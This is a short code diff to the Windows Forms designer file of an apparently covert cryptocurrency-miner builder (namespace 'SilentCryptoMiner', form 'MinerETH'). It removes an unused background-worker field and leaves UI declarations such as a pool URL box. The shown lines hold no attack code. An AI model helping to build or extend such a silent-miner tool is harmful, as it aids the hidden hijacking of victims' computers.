@@ -38,7 +38,6 @@ namespace SilentCryptoMiner
         private void InitializeComponent()
         {
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MinerETH));
-            this.BackgroundWorker2 = new System.ComponentModel.BackgroundWorker();
             this.formMinerETH = new MephTheme();
             this.tabcontrolMinerETH = new MephTabcontrol();
             this.tabConnection = new System.Windows.Forms.TabPage();
@@ -839,7 +838,6 @@ namespace SilentCryptoMiner
         }
 
         internal MephTheme formMinerETH;
-        internal System.ComponentModel.BackgroundWorker BackgroundWorker2;
         internal Label Label8;
         internal MephTextBox txtPoolURL;
         internal Label Label7;
